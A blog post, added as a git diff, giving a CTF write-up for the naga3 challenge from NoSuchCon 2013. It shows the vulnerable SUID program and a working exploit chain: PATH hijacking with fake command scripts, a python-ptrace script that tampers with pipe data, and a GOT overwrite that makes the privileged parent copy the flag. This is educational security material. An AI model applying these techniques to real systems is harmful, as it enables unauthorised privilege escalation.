@@ -1,0 +1,503 @@
+---
+layout: post
+title:  "Writeup for naga3 / NoSuchCon CTF 2013 "
+date:   2013-06-19 00:00:00 -0400
+categories: ctf,exploits
+---
+
+This is a writeup for the naga3 challenge that was part of the NoSuchCon 2013 CTF. I picked this challenge for the [Montrehack](http://montrehack.ca/) session I was hosting this month as I found it quite interesting and a bit different than the challenges I did in the past. Montrehack is an informal group that gathers every month to practice CTF challenges and the solution is presented at the end; if you live in the Montreal area feel free to drop by, it's a lot of fun and a great way to learn. For the purpose of this article I will use the challenge environment I recreated for the event, the paths are different than on the CTF server but I used the original binary.
+
+The challenges are accessible at [OverTheWire](https://overthewire.org/wargames/kishi/) so if you want to try it by yourself first you should stop reading now.
+
+The original description of the challenge was _"To monitor local system performance, a tool was developed to take some timing measurements by executing some commands"_. The first step was to find the binary. Searching for files owned by naga3 shows a program called rtv. rtv is SUID on user naga3. (To simplify things, I put the program and source code directly in /home/level2/ on my VM for Montrehack).
+
+```
+naga2@naga:/$ find . -user naga3
+
+./usr/lib/rtv.c
+./usr/lib/rtv
+```
+
+ We now have access to the binary and the source code of the program. As rtv.c is actually quite short, I reproduce it here.
+
+ ```c
+#include <stdio.h>
+#include <stdlib.h>
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sys/prctl.h>
+
+struct measurement_t {
+    char command[128];
+    unsigned long long runtime;
+} Measurements[] = {
+    {"sleep 1", 0L},
+    {"env", 0L},
+    {"md5sum /etc/passwd", 0L},
+    {"ls -l /etc/passwd", 0L},
+    {"dd if=/dev/zero of=/dev/null bs=1M count=100", 0L},
+};
+
+#define MEASUREMENTCOUNT (sizeof(Measurements) / sizeof(struct measurement_t))
+int measurementCount = MEASUREMENTCOUNT;
+
+void report_measurements(int s) {
+    int i;
+    for(i = 0; i < measurementCount; i++) {
+        //printf("Reporting command %d\n", i);
+        write(s, &i, sizeof(i));
+        write(s, &(Measurements[i].runtime), sizeof(unsigned long long));
+    }
+}
+
+void make_measurements(int s) {
+    struct timeval pre, post;
+    int i;
+    char cmd[256];
+
+    for(i = 0; i < measurementCount; i++) {
+        gettimeofday(&pre, NULL);
+        sprintf(cmd, "PARENTPID=%d %s > /dev/null 2> /dev/null", getpid(), Measurements[i].command);
+        system(cmd);
+        gettimeofday(&post, NULL);
+        Measurements[i].runtime = (post.tv_sec - pre.tv_sec) * 1000000 + post.tv_usec - pre.tv_usec;
+    }
+}
+
+void print_measurements() {
+    int i;
+    for(i = 0; i < measurementCount; i++) {
+        printf("Command[%d] \"%s\" executed in %llu""us\n", i, Measurements[i].command, Measurements[i].runtime);
+    }
+}
+
+void read_measurements(int s) {
+    int i = 0;
+    unsigned long long t;
+    int rc;
+    while(1) {
+        if((rc = read(s, &i, sizeof(i))) < sizeof(i)) {
+            printf("Truncated read: %d instead of %d\n", rc, sizeof(i));
+            exit(1);
+        }
+        if((rc = read(s, &t, sizeof(t))) < sizeof(t)) {
+            printf("Truncated read: %d instead of %d\n", rc, sizeof(t));
+            exit(1);
+        }
+
+        //printf("Measurement %d read: %llu\n", i, t);
+        Measurements[i].runtime = t;
+
+        if(i == measurementCount - 1) return;
+    }
+}
+
+int main(int argc, char *argv[]) {
+        int p[2];
+
+        if(pipe(p) < 0) {
+            fprintf(stderr, "Pipe Failed.\n");
+            exit(1);
+        }
+
+        switch (fork()) {
+            case -1:
+                perror("main: fork");
+                exit(1);
+            case 0:
+                setresuid(getuid(), getuid(), getuid());
+                setresgid(getgid(), getgid(), getgid());
+                prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
+                prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY, 0, 0, 0);
+
+                make_measurements(p[1]);
+                report_measurements(p[1]);
+                break;
+            default:
+                printf("Command runtime verification tool v1.0\n");
+                printf("Please wait while command runtimes are being verified...\n");
+                read_measurements(p[0]);
+                print_measurements();
+                break;
+        }
+    return 0;
+}
+```
+
+## Review of rtv.c
+
+Let's examine the main() function first. We see that a pipe is created [1], then a child process is created with fork [2]. In the child process, the SETUID privileges are dropped [3] and then the process is made debuggable with ptrace via the call to `prtcl(PR_SET_PTRACER)` [4]. Finally, we see that the parent and child process execute functions that have to do with "measurements" and each uses one side of the pipe [5]. We can assume that information will be passed between both processes. 
+
+![naga1](/assets/naga1.png)
+
+
+The call to `prctl()` with PR_SET_PTRACER has a big impact here. Ptrace allows us to read and modify memory of the process, set breakpoints and modify register values (including EIP). The end result is that **the code of the child is now irrelevant**, we can replace it with whatever we want. This is something we will put to use later on.
+
+## Systematic failure
+
+We then inspect the functions that are called in the child process. The first one is `make_measurements()`. This function iterates over the entries defined in the Measurement table [1] (see Figure 3). This table contains `measurement_t` structures which contains commands. Those commands are executed via `system()` [2], the output is redirected to /dev/null. Finally the function the execution time of the commands in the runtime member of the structure in the Measurements table.
+
+![naga2](/assets/naga2.png)
+
+![naga3](/assets/naga3.png)
+
+As we can see, the commands that are called are defined with relative paths. This is classic vulnerability on UNIX systems. To exploit this, we simply need to modify the PATH environment variable to add a folder that we control at the beginning and create an executable file (a shell script works just fine) for one of the commands in it (for example env in this case). The result will be that our executable will be called instead of the intended one.
+
+
+However, in this case this is not sufficient to read the flag. As the calls to system() are made by the child process, the SETUID privileges have already been dropped by then. It does however allow us to easily retrieve the pid of the child process as it is put in the `PARENTPID` variable when the commands are called. This will be of great importance in the next part. (Note : on the original CTF server, /proc/ was disabled, probably to avoid snooping between competitors. The `PARENTPID` variable was thus needed).
+
+## Let's talk
+
+ The last part of the program is where the child process returns the measurement data to the parent process which in turn prints it to the standard output  via `print_measurements()`.
+
+We see that `report_measurements()` iterates over the Measurement table with a for loop and writes 1) `i`, the index in the table and 2) `runtime`, the execution time of the executed command.
+
+![naga4](/assets/naga4.png)
+
+The same thing is done in `read_measurements()` in the parent process, however it is done slightly differently. The function enters in a while loop and reads the data provided in the pipe, if the size of the reads don't correspond to the expected size the program stops execution there [1]. The runtime information is then written in the Measurements table of the parent process, the loop ends when i is equal to the last index of the table `(measurementCount - 1)`.
+
+Normally this would be fine if we expect the child to behave correctly. However, due to our ability to use ptrace on the child process and modify the data written in the pipe, we can cause  a write outside of the Measurements table [2]. We will also control 8 bytes at every write, since we control i we can make as many writes as we want.
+
+![naga5](/assets/naga5.png)
+
+##  Arbitrary write? not quite
+
+We now know that we can cause memory overwrites in the address space of the parent memory. But where exactly can we write? Figure 6 shows the assembly code from IDA corresponding to the `Measurements[i].runtime = t;` statement in `read_measurements()`. 0x0804100 is the address of the first runtime entry in the Measurements table. Then i is multiplied by 0x88 which is the size of the measurement_t structure (128 bytes for cmd + 8 bytes for runtime).
+
+![naga6](/assets/naga6.png)
+
+The multiplication is somewhat obscured as it optimized with shift-left instructions, each shift multiplies by 2.
+
+```
+shl eax,   3; eax = i * 8
+mov ebx, eax; ebx = i * 8 
+shl ebx,   4; ebx = i * 8 * 16 = i * 128
+add eax, ebx; eax = i * 8 + i * 128 = i * 136 (136 equals 0x88)
+```
+
+The write address can be determined with the following formula :
+
+```
+       writeAddr = 0x804A100 + i * 0x88
+```
+
+If you are lucky enough to have a license for it, Hexrays Decompiler actually provides the formula directly.
+
+![naga7](/assets/naga7.png)
+
+
+We now need to find one or may memory address(es) to overwrite to hijack the control flow of the program. The GOT (Global Offset Table) is usually a good candidate. It can be dumped with the command `objdump -R rtv`. 
+
+```
+level2@montrehack:~$ objdump -R rtv
+
+rtv:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ffc R_386_GLOB_DAT    __gmon_start__
+0804a32c R_386_COPY        stderr
+0804a00c R_386_JUMP_SLOT   setresuid
+0804a010 R_386_JUMP_SLOT   read
+0804a014 R_386_JUMP_SLOT   printf
+0804a018 R_386_JUMP_SLOT   gettimeofday
+0804a01c R_386_JUMP_SLOT   __stack_chk_fail
+0804a020 R_386_JUMP_SLOT   getuid
+0804a024 R_386_JUMP_SLOT   perror
+0804a028 R_386_JUMP_SLOT   fwrite
+0804a02c R_386_JUMP_SLOT   getpid
+0804a030 R_386_JUMP_SLOT   puts
+0804a034 R_386_JUMP_SLOT   system
+0804a038 R_386_JUMP_SLOT   __gmon_start__
+0804a03c R_386_JUMP_SLOT   exit
+0804a040 R_386_JUMP_SLOT   __libc_start_main
+0804a044 R_386_JUMP_SLOT   write
+0804a048 R_386_JUMP_SLOT   getgid
+0804a04c R_386_JUMP_SLOT   prctl
+0804a050 R_386_JUMP_SLOT   pipe
+0804a054 R_386_JUMP_SLOT   fork
+0804a058 R_386_JUMP_SLOT   sprintf
+0804a05c R_386_JUMP_SLOT   setresgid
+```
+
+Inspecting the code of the program reveals the functions read, printf and exit might be called after memory corruption, being able to overwrite the entry of one those should allow us to redirect execution.
+
+A naive approach would be to calculate the write addresses for each value of i. This can be done with the following script :
+
+```python
+import sys
+BASE = 0x0804A100
+
+addresses = [
+    0x0804A010, # read
+    0x0804A014, # printf
+    0x0804A030, # puts
+    0x0804A03C, # exit
+]
+
+i = 0
+while (i <= 0xFFFFFFFF):
+    if i % 100000 == 0 :
+        print("Trying i = {0}...".format(hex(i)))
+    
+    writeAddr = (BASE + (i * 0x88)) & 0xFFFFFFFF
+    for addr in addresses:
+        if addr == writeAddr or (addr > writeAddr and addr - writeAddr <= 8):
+            print("FOUND : writeAddr {0} i = {1}".format(hex(writeAddr), i))
+            sys.exit()
+    i += 1
+
+```
+
+While this approach will find a result, it is very slow. A better approach is to take into account the fact that the value of `writeAddr` grows by 0x88 each time i is increased. We can bring back `writeAddr` around the area of the address we are targeting by increasing i so that it cycles over the 32 bit address space. To obtain this value, we divide 0xFFFFFFFF by 0x88 which gives us 31 580 641. Then it's just a matter of adjusting i upward or downward until we are between 0x88 bytes of our target address. We have now saved 31 580 640 useless computations, that's a nice optimization :-)
+
+```python
+addresses = [
+    0x0804A010, # read
+    0x0804A014, # printf
+    0x0804A030, # puts
+    0x0804A03C, # exit
+]
+
+BASE     = 0x0804A100
+TARGET   = addresses[0]
+
+
+i = 0
+n = 0
+while i <= 0xFFFFFFFF:
+    i=(31580641*n)
+    writeaddr = 0
+    diff = 0
+    
+    while True:
+        writeaddr = (BASE + (i * 0x88)) & 0xFFFFFFFF
+        if writeaddr >=  TARGET:
+            diff = writeaddr - TARGET
+            if   diff <= 0x88:
+                break
+            else:
+                i -= 1
+        else:
+            diff = TARGET - writeaddr
+            if  diff <= 0x88:
+                break
+            else:
+                i += 1
+        
+    
+    print "i = %08x writeaddr =  %08x diff = %d" % (i, writeaddr, diff)
+    n += 1
+```
+
+The script actually executes instantly, provided that our target address is near the base address 0x0804A100 which is the case for the GOT. Here is a part of the output for `read`.
+
+```
+ekse@montrehack:~/level2$ python map_address.py
+i = -0000001 writeaddr =  0804a078 diff = 104
+i = 01e1e1e1 writeaddr =  0804a088 diff = 120
+i = 03c3c3c2 writeaddr =  0804a010 diff = 0
+i = 05a5a5a3 writeaddr =  08049f98 diff = 120
+i = 07878785 writeaddr =  08049fa8 diff = 104
+i = 09696967 writeaddr =  08049fb8 diff = 88
+i = 0b4b4b49 writeaddr =  08049fc8 diff = 72
+i = 0d2d2d2b writeaddr =  08049fd8 diff = 56
+i = 0f0f0f0d writeaddr =  08049fe8 diff = 40
+i = 10f0f0ef writeaddr =  08049ff8 diff = 24
+i = 12d2d2d1 writeaddr =  0804a008 diff = 8
+i = 14b4b4b2 writeaddr =  08049f90 diff = 128
+i = 16969694 writeaddr =  08049fa0 diff = 112
+i = 18787876 writeaddr =  08049fb0 diff = 96
+i = 1a5a5a58 writeaddr =  08049fc0 diff = 80
+i = 1c3c3c3a writeaddr =  08049fd0 diff = 64
+i = 1e1e1e1c writeaddr =  08049fe0 diff = 48
+i = 1ffffffe writeaddr =  08049ff0 diff = 32
+i = 21e1e1e0 writeaddr =  0804a000 diff = 16
+i = 23c3c3c1 writeaddr =  08049f88 diff = 136
+i = 25a5a5a3 writeaddr =  08049f98 diff = 120
+i = 27878785 writeaddr =  08049fa8 diff = 104
+i = 29696967 writeaddr =  08049fb8 diff = 88
+i = 2b4b4b49 writeaddr =  08049fc8 diff = 72
+i = 2d2d2d2b writeaddr =  08049fd8 diff = 56
+i = 2f0f0f0d writeaddr =  08049fe8 diff = 40
+i = 30f0f0ef writeaddr =  08049ff8 diff = 24
+....
+```
+
+We can see that by using an i value of 03c3c3c2 we are able to overwrite `read` directly.
+
+##  rtvtrace.py - ptrace to my heart
+
+I wrote a script using python-ptrace to modify the values of i and runtime that are sent in the pipe by the child process. To go faster, I actually used the Gdb implementation provided with the library which allows to easily create breakpoints and modify memory and registry values.
+
+The code is actually quite simple. It sets 2 breakpoints, one before the write of i in the pipe and the second before the write of runtime. In each case eax points to the data that will be written, we simply  point it to another address with our own supplied data. Note that in this debugger, breakpoint are removed after being hit so they will be executed only for the first command. To test that it works, we overwrite the address of read in the GOT with 0x41424344.
+
+```python
+import sys
+import struct
+
+from gdb import Gdb
+from ptrace.debugger import PtraceDebugger, ProcessSignal, ProcessExit
+
+pid = sys.argv[1]
+gdb = Gdb()
+gdb.debugger = PtraceDebugger()
+gdb.process  = None
+
+gdb.attachProcess(pid)
+print("[!] attached to {0}".format(pid))
+
+#gdb.breakpoint("0x80487e0")
+gdb.breakpoint("0x080487d6")
+gdb.breakpoint("0x08048802")
+while(True):
+
+    try:
+        gdb.cont()
+        eip = gdb.process.getreg("eip")
+        print("EIP: {0}".format(hex(eip)))
+
+        #if eip == 0x80487e0:
+        #    print("pipe descriptor: {0}".format(hex(gdb.process.getreg("eax"))))
+
+        # WRITE WHERE
+        if eip == 0x80487d6:
+            eax = gdb.process.getreg("eax")
+            i = gdb.process.readBytes(eax, 4)
+            print("Current id loc: {0} value : {1}".format(hex(eax), struct.unpack("<I",i)))
+            print("Changing data location for write of id...")
+            gdb.process.writeBytes(0x0804a060, struct.pack("<I",63161282))
+            gdb.process.setreg("eax", 0x0804a060)
+
+        # WRITE WHAT
+        if eip == 0x08048802:
+            gdb.process.writeBytes(0x0804a060, struct.pack("<I", 0x08048828) + "\xFF\xF1\xF2\xF3")
+            gdb.process.setreg("eax", 0x0804a060)
+
+
+
+    except ProcessSignal, event:
+        print("[!] Event {0}".format(event))
+        continue
+    except ProcessExit, event:
+        print(event)
+    except Exception, event:
+        print("Unhandled exception : {0}".format(event))
+        break
+```
+
+The setup of our exploit will be as follow :
+
+1. Create an env script that writes PARENTPID to a file named "pid"
+2. execute `PATH=.:$PATH rtv`
+3. execute rtvtrace.py and attach to the child process
+
+Here is the output of rtvtrace.py when executed.
+
+```
+ekse@montrehack:~/level2/$ ./run_rtvtrace.sh
+Waiting for pid...
+Switch to
+[!] attached to 1188
+New breakpoint:
+New breakpoint:
+------------------------------------------------------------
+PID: 1188
+Signal: SIGCHLD
+Child process 1191 exited normally
+Signal sent by user 1000
+------------------------------------------------------------
+interrupted by SIGCHLD
+EIP: 0xb775d424L
+Send SIGCHLD to
+------------------------------------------------------------
+PID: 1188
+Signal: SIGCHLD
+Child process 1199 exited normally
+Signal sent by user 1000
+------------------------------------------------------------
+interrupted by SIGCHLD
+EIP: 0xb775d424L
+Send SIGCHLD to
+------------------------------------------------------------
+PID: 1188
+Signal: SIGCHLD
+Child process 1201 exited normally
+Signal sent by user 1000
+------------------------------------------------------------
+interrupted by SIGCHLD
+EIP: 0xb775d424L
+Send SIGCHLD to
+------------------------------------------------------------
+PID: 1188
+Signal: SIGCHLD
+Child process 1203 exited normally
+Signal sent by user 1000
+------------------------------------------------------------
+interrupted by SIGCHLD
+EIP: 0xb775d424L
+Send SIGCHLD to
+Stopped at
+EIP: 0x80487d6L
+Current id loc: 0xbff5295cL value : (0,)
+Changing data location for write of id...
+Stopped at
+EIP: 0x8048802L
+Process 1188 exited normally
+Unhandled exception : None
+```
+
+And sure enough, when running rtv in GDB execution ends up at 0x44434241.
+
+```
+ekse@montrehack:~/level2/exploit_1$ ./run_level2.sh
+
+(gdb) run
+Starting program: /home/level2/rtv
+Command runtime verification tool v1.0
+Please wait while command runtimes are being verified...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44434241 in ?? ()
+
+(gdb) bt
+#0  0x44434241 in ?? ()
+#1  0x080489d5 in read_measurements ()
+#2  0x08048bdc in main ()
+```
+
+## Where do we put our shellcode?
+
+We now have control of the execution of the parent process. The last thing we need to do is to figure where to put our shellcode and jump to it. A technique is often use when doing this kind of challenge is to put the shellcode in an environment variable, prepend a large nopsled in front of it and jump somewhere in it. However this approach does not work as the stack is defined as non-executable, which we can confirm with execstack.
+
+```
+ekse@montrehack:~/level2/exploit_1$ execstack /home/level2/rtv
+- /home/level2/rtv
+```
+
+If we look at the output of the map_address.py script, we see that we can have multiple consecutive writes of 8 bytes so we should probably be able to write a short shellcode somewhere. The problem we are facing is that none of the memory section of rtv is both writeable and executable.
+
+![naga8](/assets/naga8.png)
+
+Another approach would be to use a ROP payload to set the memory region where we put our shellcode executable, but that is somewhat complicated and I'm lazy so I kept looking for an easier way. I reviewed what could be overwritten in the memory and thought about the commands in the Measurements table. We could probably overwrite one of the commands and have it execute what we want, but that doesn't work either as it's the commands in the child address space that are executed... and then it all became clear.
+
+![naga9](/assets/naga9.png)
+
+All we need to do is to redirect execution to `make_measurements()` so that it is executed in the parent process. This way we can use another command that is called by `system()` (I used `md5sum`) to copy the flag. The final setup of our exploit is like this:
+
+
+1. `env` is a script that writes PARENTPID to the file "pid"
+2. `md5sum` is a script that copies the flag to the file "flag"
+3. execute `PATH=.:$PATH rtv`
+4. attach to the child process with rtvtrace.py
+5. overwrite the address of the `read()` function in the GOT with the address of `make_measurements()`
+6. `md5sum` is called by the parent process, we win.
+
+You can find the code of the exploit and the scripts I presented on my [github repository](https://github.com/ekse/naga3). The slides I made for Montrehack are also [available](https://docs.google.com/presentation/d/1XzNQulpjE-zqHkBK3iLN5JbAh5iMkl-c3ExFE9C4ZeI/).
+
+
+## Conclusion
+
+ This challenge required the use of 3 different vulnerabilities of the program. Each of those taken separately was not sufficient to exploit the program. This is something that is often needed today to bypass modern protection mechanisms, for example one of the winners of Pwn2Own last year [used 6 vulnerabilities](http://blog.chromium.org/2012/05/tale-of-two-pwnies-part-1.html) to exploit Google Chrome.
+
+As I write these lines, I just learned about a [new vulnerability](http://www.freebsd.org/security/advisories/FreeBSD-SA-13%3a06.mmap.asc) in FreeBSD that was disclosed today and that involves ptrace and mmap. While the context is completely different, it's funny to see that the [exploit code](https://rdot.org/forum/showpost.php?p=32147&postcount=3) is actually simpler than what we had to do :-) 
